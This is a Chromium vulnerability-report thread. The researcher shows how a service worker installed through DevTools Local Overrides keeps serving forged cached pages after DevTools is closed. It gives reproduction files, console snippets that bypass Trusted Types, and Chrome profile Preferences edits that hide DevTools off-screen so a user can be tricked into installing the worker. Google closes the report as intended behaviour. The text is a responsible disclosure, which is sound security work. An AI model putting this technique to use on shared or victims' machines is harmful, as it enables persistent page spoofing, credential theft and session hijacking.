@@ -1,0 +1,289 @@
+Issue ID: 407489886
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Able To Install Service Workers from Network Overrides, Persist Without DevTools Open</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>Attackers can install local <strong>Service Workers (SW)</strong> on any site using <strong>Chrome DevTools Network Overrides</strong>.</p>
+<p>If blocked by <strong>Content Security Policy (CSP)</strong>, such as in the case of <a href="https://accounts.google.com/o/oauth2/v2/auth" data-b-widget="url" data-b-original-href="https://accounts.google.com/o/oauth2/v2/auth" data-b-redirected-href="https://www.google.com/url?q=https://accounts.google.com/o/oauth2/v2/auth&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw239wqPCWh_2lRYsBTHW-uC">https://accounts.google.com/o/oauth2/v2/auth</a> (oauth sign-in), this can be easily bypassed by overriding the CSP headers first, reloading the page, then installing the service worker overrides.</p>
+<p>After a successful installation, the content overrides can be disabled, and the SW will continue to function normally without DevTools open. It persists between sessions unless the browser profile is reset or site settings and cookies are cleared every time.</p>
+<h3>Attack Scenario</h3>
+<ol>
+<li>Attacker uses a public/shared PC.</li>
+<li>Attacker downloads, copies, or creates necessary attack files.</li>
+<li>Attacker installs local service workers on target domains.</li>
+<li>Attacker caches prepared local HTML files or scripts.</li>
+<li>Attacker disables content overrides and deletes evidence files to remove traces.</li>
+<li>Victim uses the public PC.</li>
+<li>Victim accesses online services that have been forged by the attacker.</li>
+<li>Data is sent to the attacker from a malicious script.</li>
+</ol>
+<h3>Steps to Reproduce</h3>
+<p>In this POC, we will replace the <a href="http://www.google.com" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="https://www.google.com/url?q=http://www.google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0x0NQRpl8cQqw-KhvGZyM_">www.google.com</a> homepage.</p>
+<ol>
+<li>Create the overrides folder, service worker, and page override for <a href="http://www.google.com" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="https://www.google.com/url?q=http://www.google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0x0NQRpl8cQqw-KhvGZyM_">www.google.com</a> (alternatively, download and extract the attached <code>.zip</code>) :</li>
+</ol>
+<pre><code>/chrome-sw-overrides-poc/
+└── /www.google.com/
+    ├── sw.js
+    ├── index.html
+    └── .headers
+</code></pre>
+<p><code>sw.js</code></p>
+<pre><code><span class="stx-comment">// serve files from cache (offline-first), or fetch from network</span>
+self.addEventListener(<span class="stx-string">&#39;fetch&#39;</span>, <span class="stx-keyword">function</span> (<span>e</span>) {
+    e.respondWith(
+        caches.match(e.request).then(<span class="stx-keyword">function</span> (<span>resp</span>) {
+            <span class="stx-keyword">if</span> (resp) <span class="stx-keyword">return</span> resp;
+
+            <span class="stx-keyword">return</span> fetch(e.request)
+                .then(<span class="stx-keyword">function</span> (<span>r</span>) {
+                    <span class="stx-keyword">return</span> r;
+                })
+                .catch(<span class="stx-keyword">function</span> () {
+                    console.error(<span class="stx-string">&#39;Check connection.&#39;</span>);
+                });
+        })
+    );
+});
+</code></pre>
+<p><code>index.html</code></p>
+<pre><code>Hello World
+</code></pre>
+<p><code>.headers</code>, required to set the correct content-type for the SW file.</p>
+<pre><code>[
+  {
+    <span class="stx-string">&quot;applyTo&quot;</span>: <span class="stx-string">&quot;*.js&quot;</span>,
+    <span class="stx-string">&quot;headers&quot;</span>: [
+      {
+        <span class="stx-string">&quot;name&quot;</span>: <span class="stx-string">&quot;content-type&quot;</span>,
+        <span class="stx-string">&quot;value&quot;</span>: <span class="stx-string">&quot;text/javascript; charset=UTF-8&quot;</span>
+      }
+    ]
+  }
+]
+</code></pre>
+<ol start="2">
+<li>Visit <a href="https://google.com" data-b-widget="url" data-b-original-href="https://google.com" data-b-redirected-href="https://www.google.com/url?q=https://google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0VT8wnjtPCJ_ZzcGf2doE0">https://google.com</a>.</li>
+<li>Enable Local Overrides. Open DevTools, go to Sources → Overrides → Select folder for overrides. Pick the folder in the first step (<code>chrome-sw-overrides-poc</code>), then click <strong>Allow</strong>.</li>
+<li>Refresh the page. The google.com homepage should now be replaced with the &quot;Hello World&quot; text.</li>
+<li>Open Console tab, then enter the following snippet to install the SW provided in step 1:</li>
+</ol>
+<pre><code><span class="stx-keyword">if</span> (window.trustedTypes &amp;&amp; trustedTypes.createPolicy) {
+    <span class="stx-comment">// sites may require trusted script URL policy, e.g. google.com</span>
+    <span class="stx-keyword">const</span> <span>policy</span> = trustedTypes.createPolicy(<span class="stx-string">&#39;default&#39;</span>, {
+        <span>createScriptURL</span>: (<span>input</span>) =&gt; input
+    });
+
+    <span class="stx-keyword">if</span> (<span class="stx-keyword">typeof</span> navigator !== <span class="stx-string">&#39;undefined&#39;</span> &amp;&amp; <span class="stx-string">&#39;serviceWorker&#39;</span> <span class="stx-keyword">in</span> navigator) {
+        navigator.serviceWorker.register(policy.createScriptURL(<span class="stx-string">&#39;/sw.js&#39;</span>))
+            .then(() =&gt; console.log(<span class="stx-string">&#39;Service Worker registered&#39;</span>))
+            .catch((<span>e</span>) =&gt; console.error(<span class="stx-string">&#39;Something went wrong.&#39;</span>, e));
+    }
+}
+</code></pre>
+<ol start="6">
+<li>Confirm SW installation in Application → Service workers tab.</li>
+<li>Next, cache the local overrides files, enter in Console:</li>
+</ol>
+<pre><code><span class="stx-keyword">let</span> <span>cacheName</span> = <span class="stx-string">&#39;example-cache&#39;</span>;
+<span class="stx-keyword">let</span> <span>cacheURLs</span> = [<span class="stx-string">&#39;/&#39;</span>];
+window.caches.open(cacheName)
+.then(<span class="stx-keyword">function</span>(<span>cache</span>) {
+    <span class="stx-keyword">return</span> Promise.all(
+      cacheURLs.map(<span class="stx-keyword">function</span>(<span>url</span>) {
+        <span class="stx-keyword">return</span> cache.add(url).catch(<span class="stx-keyword">function</span>(<span>error</span>) {
+          console.error(<span class="stx-string">&#39;Failed to cache URL:&#39;</span>, url, error);
+        });
+      })
+    );
+})
+.then(<span class="stx-keyword">function</span>() {
+    console.log(<span class="stx-string">&#39;Done! Reload to take effect.&#39;</span>);
+})
+.catch(<span class="stx-keyword">function</span>(<span>error</span>) {
+    console.log(<span class="stx-string">&#39;Failed. Check console.&#39;</span>);
+});
+</code></pre>
+<ol start="7">
+<li>Disable overrides. Go to Sources → Overrides, uncheck <strong>Enable Local Overrides</strong>.</li>
+<li>Close DevTools, then refresh the page.</li>
+</ol>
+<p>google.com page should now serve the forged content from the cache, displaying &quot;Hello World&quot; text.</p>
+<h3>Fix Recommendation</h3>
+<p>Block SW registration via DevTools&#39; Content Overrides.</p>
+<h3>Tested Sites</h3>
+<table>
+<thead>
+<tr>
+<th>Site</th>
+<th>Status</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://draft.blogger.com/" data-b-widget="url" data-b-original-href="https://draft.blogger.com/" data-b-redirected-href="https://www.google.com/url?q=https://draft.blogger.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw16n37ueNbIk7g88Uv8BEs-">draft.blogger.com</a></td>
+<td>🔴 Vulnerable</td>
+<td>No CSP restriction</td>
+</tr>
+<tr>
+<td><a href="https://myaccount.google.com/" data-b-widget="url" data-b-original-href="https://myaccount.google.com/" data-b-redirected-href="https://www.google.com/url?q=https://myaccount.google.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1G0vbDkAUmJGROdZGDa9-5">myaccount.google.com</a></td>
+<td>🔴 Vulnerable</td>
+<td>No CSP restriction</td>
+</tr>
+<tr>
+<td><code>accounts.google.com/o/oauth2/v2/auth</code></td>
+<td>🔴 Vulnerable</td>
+<td>Allows SW registration when CSP is overridden (emptied)</td>
+</tr>
+<tr>
+<td><a href="https://discover.apps.chrome/" data-b-widget="url" data-b-original-href="https://discover.apps.chrome/" data-b-redirected-href="https://www.google.com/url?q=https://discover.apps.chrome/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3NnEWCFMDIOxF5m4lzpxAW">discover.apps.chrome</a></td>
+<td>✅ Safe</td>
+<td>Unregisters SW on load</td>
+</tr>
+</tbody>
+</table>
+<p>After that, I realized any site could be vulnerable and stopped checking.</p>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>One of the most vulnerable targets is shared PC users (e.g. in schools or public libraries), where an attacker only needs access once to set up their pre-made SW and cache files.</p>
+<p>By injecting malicious scripts or forging pages, they can steal private information, hijack account sessions, phishing, and spy on user activities (just a few that I can think of) on any online or HTTPS site.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>134.0.6998.130 (Official Build) (64-bit)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Other</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>vanillawebdev</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: bi...@gmail.com
+Able To Install Service Workers from Network Overrides, Persist Without DevTools Open
+
+Author: bi...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bi...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: bi...@gmail.com
+<p>Another impact analysis on who can exploit the vulnerability:</p>
+<p>Individuals who lend their PC with forged content already present on trusted sites. In this case, the victim wouldn&#39;t know when or where their data might leak, especially if the attacker collects the data and waits before using it.</p>
+
+Author: za...@google.com
+<p>Hi, thanks for reporting. We appreciate the detailed report!</p>
+<p>However, this reported issue, while allowing for local manipulation of website behavior through Service Workers, relies on the intentional use of Chrome Developer Tools&#39; Network Overrides feature. DevTools are designed for local debugging it has the ability to alter network requests, inject scripts, and modify local storage. As this requires direct access to the user&#39;s machine and active use of developer tools, it&#39;s considered a misuse of development features rather than a security vulnerability in the Service Worker implementation itself. Hence, I am closing this bug as WAI, please feel free to reopen if you disagree. And thanks again for the detailed report!</p>
+
+Author: za...@google.com
+googlers_unrestricted
+
+Author: za...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: bi...@gmail.com
+<p>Hello,</p>
+<p>Strongly disagree with that. The premise of Network Overrides is that modifications require DevTools to stay open. The problem is that SW persists even after DevTools is closed.</p>
+<p>It doesn&#39;t address the fact that users who are unaware of the attack will continue to be affected even after the attacker has left.</p>
+<p>This exploit leaves behind a persistent backdoor that does not need DevTools to function.</p>
+
+Author: bi...@gmail.com
+<blockquote>
+<p>... As this requires direct access to the user&#39;s machine and active use of developer tools</p>
+</blockquote>
+<p>Sorry, I didn&#39;t pay attention to that part. Okay, I understand it&#39;s not eligible for VRP, but the team should at least mitigate the issue since it persists after DevTools is closed.</p>
+
+Author: bi...@gmail.com
+<p>Hello, can we have someone reassess this, please?</p>
+<p>I think even after content overrides are cached and the service worker is installed, if DevTools is closed and the page is refreshed, the service worker should unregister.</p>
+<blockquote>
+<p>As this requires direct access to the user&#39;s machine and active use of developer tools</p>
+</blockquote>
+<p>If the attacker succeeds in injecting a malicious program to modify Chrome profile preferences, they could enable local overrides, choose a folder of their choice, and set DevTools to open as undocked by default, positioning it outside the screen.</p>
+<p>After that, the last thing to do is trick the user into pressing F12 to open the neatly hidden DevTools and refresh the page to install the service worker.</p>
+<p>..\Chrome\UserData&lt;profile&gt;\Preferences</p>
+<pre><code><span class="stx-comment">// set overrides folder</span>
+<span class="stx-string">&quot;devtools&quot;</span>: {
+<span>	</span><span class="stx-comment">// ..</span>
+<span>	</span><span class="stx-string">&quot;file_system_paths&quot;</span>: { <span class="stx-string">&quot;D:\\temp\\igotu&quot;</span>: <span class="stx-string">&quot;overrides&quot;</span> },
+<span>	</span><span class="stx-comment">// ..</span>
+}
+<span class="stx-comment">// ..</span>
+
+<span class="stx-comment">// enable local overrides</span>
+<span class="stx-string">&quot;persistence-network-overrides-enabled&quot;</span>: <span class="stx-string">&quot;true&quot;</span>,
+<span class="stx-comment">// ..</span>
+
+<span class="stx-comment">// set devtools position (undocked, outside screen)</span><span><span class="stx-comment"> </span></span>
+<span class="stx-string">&quot;currentDockState&quot;</span>: <span class="stx-string">&quot;\&quot;undocked\&quot;&quot;</span>,
+<span class="stx-comment">// ..</span>
+<span class="stx-string">&quot;browser&quot;</span>: {
+<span>	</span><span class="stx-string">&quot;app_window_placement&quot;</span>: {
+<span>	</span><span>	</span><span class="stx-string">&quot;DevToolsApp&quot;</span>: {
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;always_on_top&quot;</span>: <span class="stx-keyword">false</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;bottom&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;left&quot;</span>: -<span class="stx-number">2000</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;maximized&quot;</span>: <span class="stx-keyword">false</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;right&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;top&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;work_area_bottom&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;work_area_left&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;work_area_right&quot;</span>: <span class="stx-number">0</span>,
+<span>	</span><span>	</span><span>	</span><span class="stx-string">&quot;work_area_top&quot;</span>: <span class="stx-number">0</span>
+<span>	</span><span>	</span>},
+<span>	</span><span>	</span><span class="stx-comment">// ..</span>
+<span>	</span>}
+<span>	</span><span class="stx-comment">// ..</span>
+}
+</code></pre>
+<p>Please watch the attached demo.</p>
+
+Author: bi...@gmail.com
+TkRBM05EZzVPRGcyTFRZME5USTVOVFF5TFMwM05qWTVNakE0T0RVPQ==
+
+Author: bi...@gmail.com
+<blockquote>
+<p>while allowing for local manipulation of website behavior through Service Workers, relies on the intentional use of Chrome Developer Tools&#39; Network Overrides feature</p>
+</blockquote>
+<p>I&#39;d like to highlight that it is correct that it is WAI, but that is the very issue—i.e., the current network overrides spec likely doesn&#39;t account for the installation of a service worker from network overrides that persist after DevTools is closed.</p>
+<blockquote>
+<p>As this requires direct access to the user&#39;s machine and active use of developer tools, it&#39;s considered a misuse of development features rather than a security vulnerability in the Service Worker implementation itself</p>
+</blockquote>
+<p>The real attacker would find a clever way to install the service worker without directly accessing the machine. For example, through a compromised repository or a dependency package that manipulates Chrome profiles. My knowledge in this area is limited, but as I&#39;m waiting for this issue to be reopened, I&#39;m considering a few possible scenarios.</p>
+
+Author: bi...@gmail.com
+<p>Hello, can this issue be reopened as an <strong>Abuse Risk vulnerability</strong>? Based on this comment, it should be sufficient to qualify as one:</p>
+<blockquote>
+<p>... <strong>it&#39;s considered a misuse of development features</strong> rather than a security vulnerability in the Service Worker implementation itself.</p>
+</blockquote>
+<p>I believe it will receive a better response if directed to the appropriate team.</p>
+<p>If that’s not possible, I’d like to file a new report through the proper channel, with improved report details, of course.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
